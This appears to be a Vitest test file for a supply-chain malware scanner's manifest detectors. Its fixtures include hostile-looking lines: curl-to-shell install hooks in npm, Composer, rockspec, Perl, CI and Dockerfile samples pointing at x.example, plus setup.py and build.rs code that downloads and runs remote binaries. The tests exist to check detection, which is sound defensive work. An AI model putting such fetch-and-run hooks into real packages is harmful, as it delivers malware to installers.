/**
 * Layer C — manifest detectors. These look at package metadata, build
 * scripts, and CI definitions for the supply-chain shapes that have
 * historically delivered malware (axios 2026, chalk/debug 2025, etc.).
 *
 * Rule IDs covered:
 *   obf.manifest-install-script    — install/lifecycle hooks across package
 *                                    manifests (npm, Composer, gemspec,
 *                                    rockspec, nuspec).
 *   obf.python-setup-side-effect  — setup.py with code outside setup() call
 *   obf.perl-makefile-side-effect — Makefile.PL / Build.PL with code outside
 *                                    the declarative WriteMakefile call.
 *   obf.cargo-build-rs-network    — build.rs that touches the network
 *   obf.gha-curl-pipe-shell       — GitHub Actions curl|bash
 *   obf.dockerfile-curl-pipe-shell — Dockerfile RUN curl|bash
 */

import { describe, expect, it } from "vitest";
import { scan } from "@obfuscan/core";
import { virtualFiles, silentOptions } from "../helpers/matchers";

describe("Layer C: manifest-install-script (npm)", () => {
  it("flags package.json with a postinstall script", async () => {
    const pkg = JSON.stringify({
      name: "innocent",
      version: "1.0.0",
      scripts: { postinstall: "node scripts/setup.js" },
    });
    const { input, fileResolver } = virtualFiles({ "package.json": pkg });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toFlag("obf.manifest-install-script");
  });

  it("flags package.json with preinstall + curl|sh", async () => {
    const pkg = JSON.stringify({
      name: "x",
      version: "1.0.0",
      scripts: { preinstall: "curl -s https://x.example/i.sh | sh" },
    });
    const { input, fileResolver } = virtualFiles({ "package.json": pkg });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toFlag("obf.manifest-install-script");
    // curl|sh should escalate severity above warn
    expect(result).toBlock("obf.manifest-install-script");
  });

  it("does NOT flag package.json with only build/test scripts", async () => {
    const pkg = JSON.stringify({
      name: "ok",
      version: "1.0.0",
      scripts: { build: "tsc", test: "vitest" },
    });
    const { input, fileResolver } = virtualFiles({ "package.json": pkg });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toNotFlag("obf.manifest-install-script");
  });
});

describe("Layer C: manifest-install-script (composer)", () => {
  it("flags composer.json with a post-install-cmd that pipes curl into sh", async () => {
    const pkg = JSON.stringify({
      name: "vendor/pkg",
      scripts: { "post-install-cmd": "curl -fsSL https://x.example/i.sh | sh" },
    });
    const { input, fileResolver } = virtualFiles({ "composer.json": pkg });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toFlag("obf.manifest-install-script");
    expect(result).toBlock("obf.manifest-install-script");
  });
});

describe("Layer C: manifest-install-script (gemspec)", () => {
  it("flags a gemspec that declares native extensions", async () => {
    const src = `
Gem::Specification.new do |s|
  s.name        = "innocent"
  s.version     = "1.0.0"
  s.extensions  = ["ext/innocent/extconf.rb"]
end
`;
    const { input, fileResolver } = virtualFiles({ "innocent.gemspec": src });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toFlag("obf.manifest-install-script");
  });

  it("does NOT flag a pure-ruby gemspec", async () => {
    const src = `
Gem::Specification.new do |s|
  s.name        = "ok"
  s.version     = "1.0.0"
  s.summary     = "a thing"
end
`;
    const { input, fileResolver } = virtualFiles({ "ok.gemspec": src });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toNotFlag("obf.manifest-install-script");
  });
});

describe("Layer C: manifest-install-script (rockspec)", () => {
  it("flags a rockspec with build.type = command", async () => {
    const src = `
package = "innocent"
version = "1.0-1"
build = {
  type = "command",
  build_command = "curl https://x.example/i.sh | sh",
}
`;
    const { input, fileResolver } = virtualFiles({ "innocent-1.0-1.rockspec": src });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toFlag("obf.manifest-install-script");
    expect(result).toBlock("obf.manifest-install-script");
  });
});

describe("Layer C: manifest-install-script (nuspec)", () => {
  it("flags a nuspec that ships install.ps1", async () => {
    const xml = `<?xml version="1.0"?>
<package>
  <metadata><id>innocent</id><version>1.0.0</version></metadata>
  <files>
    <file src="tools/install.ps1" target="tools/install.ps1" />
  </files>
</package>`;
    const { input, fileResolver } = virtualFiles({ "innocent.nuspec": xml });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toFlag("obf.manifest-install-script");
  });
});

describe("Layer C: perl-makefile-side-effect", () => {
  it("flags Makefile.PL with a system() call before WriteMakefile", async () => {
    const src = `
use strict;
use ExtUtils::MakeMaker;
system("curl -fsSL https://x.example/i.sh | sh");
WriteMakefile(
    NAME => "Innocent",
    VERSION => "1.00",
);
`;
    const { input, fileResolver } = virtualFiles({ "Makefile.PL": src });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toFlag("obf.perl-makefile-side-effect");
  });

  it("does NOT flag a clean Makefile.PL", async () => {
    const src = `
use strict;
use ExtUtils::MakeMaker;
WriteMakefile(
    NAME => "OK",
    VERSION => "1.00",
);
`;
    const { input, fileResolver } = virtualFiles({ "Makefile.PL": src });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toNotFlag("obf.perl-makefile-side-effect");
  });
});

describe("Layer C: python-setup-side-effect", () => {
  it("flags setup.py with code outside setup()", async () => {
    const src = `
import os, urllib.request
urllib.request.urlretrieve("https://x.example/p", "/tmp/p")
os.system("/tmp/p")
from setuptools import setup
setup(name="innocent", version="1.0.0")
`;
    const { input, fileResolver } = virtualFiles({ "setup.py": src });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toFlag("obf.python-setup-side-effect");
  });

  it("does NOT flag a clean setup.py", async () => {
    const src = `
from setuptools import setup
setup(name="ok", version="1.0.0", packages=["ok"])
`;
    const { input, fileResolver } = virtualFiles({ "setup.py": src });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toNotFlag("obf.python-setup-side-effect");
  });
});

describe("Layer C: cargo-build-rs-network", () => {
  it("flags build.rs that downloads a binary", async () => {
    const src = `
fn main() {
    let body = reqwest::blocking::get("https://x.example/blob")
        .unwrap().bytes().unwrap();
    std::fs::write("/tmp/b", &body).unwrap();
}
`;
    const { input, fileResolver } = virtualFiles({ "build.rs": src });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toFlag("obf.cargo-build-rs-network");
  });

  it("does NOT flag a build.rs that only emits cargo: directives", async () => {
    const src = `
fn main() {
    println!("cargo:rerun-if-changed=build.rs");
}
`;
    const { input, fileResolver } = virtualFiles({ "build.rs": src });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toNotFlag("obf.cargo-build-rs-network");
  });
});

describe("Layer C: gha-curl-pipe-shell", () => {
  it("flags GitHub Actions workflow with curl|bash", async () => {
    const yml = `
name: ci
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: curl -fsSL https://x.example/install | bash
`;
    const { input, fileResolver } = virtualFiles({ ".github/workflows/ci.yml": yml });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toFlag("obf.gha-curl-pipe-shell");
  });

  it("does NOT flag GitHub Actions with pinned action SHAs", async () => {
    const yml = `
name: ci
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@a12c1f2e8a89f3d8f7f8b1c8c8d4f5e6a7b8c9d0
      - run: npm test
`;
    const { input, fileResolver } = virtualFiles({ ".github/workflows/ci.yml": yml });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toNotFlag("obf.gha-curl-pipe-shell");
  });
});

describe("Layer C: dockerfile-curl-pipe-shell", () => {
  it("flags Dockerfile RUN curl|bash", async () => {
    const df = `
FROM debian:stable-slim
RUN curl -fsSL https://x.example/i.sh | bash
`;
    const { input, fileResolver } = virtualFiles({ "Dockerfile": df });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toFlag("obf.dockerfile-curl-pipe-shell");
  });
});
